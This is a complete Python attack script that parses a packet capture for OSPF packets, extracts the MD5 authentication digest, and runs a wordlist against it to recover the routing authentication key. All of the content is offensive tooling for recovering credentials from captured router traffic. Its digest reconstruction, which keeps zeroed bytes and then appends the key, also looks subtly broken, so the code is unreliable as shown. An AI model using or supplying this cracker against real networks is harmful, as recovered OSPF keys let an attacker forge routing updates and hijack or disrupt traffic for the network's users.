#!/usr/bin/env python3
import sys, hashlib
from scapy.all import rdpcap, IP
if len(sys.argv)!=3:
    print("Usage: python3 ospf_crack.py capture.pcap wordlist.txt"); sys.exit(1)
pcap = sys.argv[1]; wl = sys.argv[2]
pkts = rdpcap(pcap)
raw_base = None; captured_digest = None
for p in pkts:
    if IP in p and p[IP].proto == 89:
        raw = bytes(p[IP].payload)
        if len(raw) >= 24+16:
            captured_digest = raw[-16:]
            pkt = bytearray(raw)
            for i in range(16): pkt[len(pkt)-1-i]=0
            pkt[12]=0; pkt[13]=0
            raw_base = bytes(pkt); break
if raw_base is None:
    print("No suitable OSPF packet found."); sys.exit(2)
print("Captured digest (hex):", captured_digest.hex())
with open(wl,'r',errors='ignore') as f:
    for line in f:
        key = line.rstrip('\r\n')
        if not key: continue
        keyb = key.encode('utf-8')
        if hashlib.md5(raw_base + keyb).digest() == captured_digest:
            print("FOUND_RAW:"+key); sys.exit(0)
        key16 = (keyb + b'\x00'*16)[:16]
        if hashlib.md5(raw_base + key16).digest() == captured_digest:
            print("FOUND_PAD16:"+key); sys.exit(0)
print("No match found with this wordlist."); sys.exit(3)
